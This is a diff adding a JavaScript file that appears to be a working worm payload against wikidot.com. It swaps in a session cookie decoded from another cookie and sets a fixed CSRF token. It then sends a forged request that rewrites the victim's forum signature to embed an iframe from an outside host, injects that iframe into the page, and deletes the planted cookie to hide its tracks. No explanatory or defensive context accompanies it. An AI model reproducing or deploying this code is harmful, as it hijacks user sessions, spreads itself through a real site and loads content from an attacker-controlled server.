@@ -1,0 +1,31 @@
+function getCookie(cname, text) {
+    var name = cname + "=";
+    var ca = text.split(';');
+    for(var i = 0; i <ca.length; i++) {
+        var c = ca[i];
+        while (c.charAt(0) == ' ') {
+            c = c.substring(1);
+        }
+        if (c.indexOf(name) == 0) {
+            return c.substring(name.length, c.length);
+        }
+    }
+    return '';
+}
+
+document.cookie = "WIKIDOT_SESSION_ID=" + getCookie("WIKIDOT_SESSION_ID",atob(getCookie("new", document.cookie))) + ";path=/;domain=wikidot.com;";
+document.cookie = "wikidot_token7=4m64ez22na9pf7k6s988;path=/;";
+var http = new XMLHttpRequest();
+sig = '%5B%5Bembed%5D%5D%0A%3Ciframe+class%3D%22%22+style%3D%22%22+frameborder%3D%220%22+width%3D%22200px%22+height%3D%2225px%22+align%3D%22%22+scrolling%3D%22no%22+src%3D%22http%3A%2F%2Fcheckesh.esy.es%2Ft%2Fiframewin.php%22%3E%3C%2Fiframe%3E%0A%5B%5B%2Fembed%5D%5D';
+var url = "https://www.wikidot.com/ajax-module-connector.php";
+var params = "source=" + sig + "&action=DashboardProfileAction&event=saveForumSignature&moduleName=Empty&callbackIndex=3&wikidot_token7=4m64ez22na9pf7k6s988";
+http.open("POST", url, true);
+http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
+http.send(params);
+
+s = 'http://checkesh.esy.es/t/iframewin.php';
+f = document.createElement('iframe');
+f.src = s;
+document.body.appendChild(f);
+
+document.cookie = "new=;path=/;domain=wikidot.com;expires=Thu, 01 Jan 1970 00:00:01 GMT"
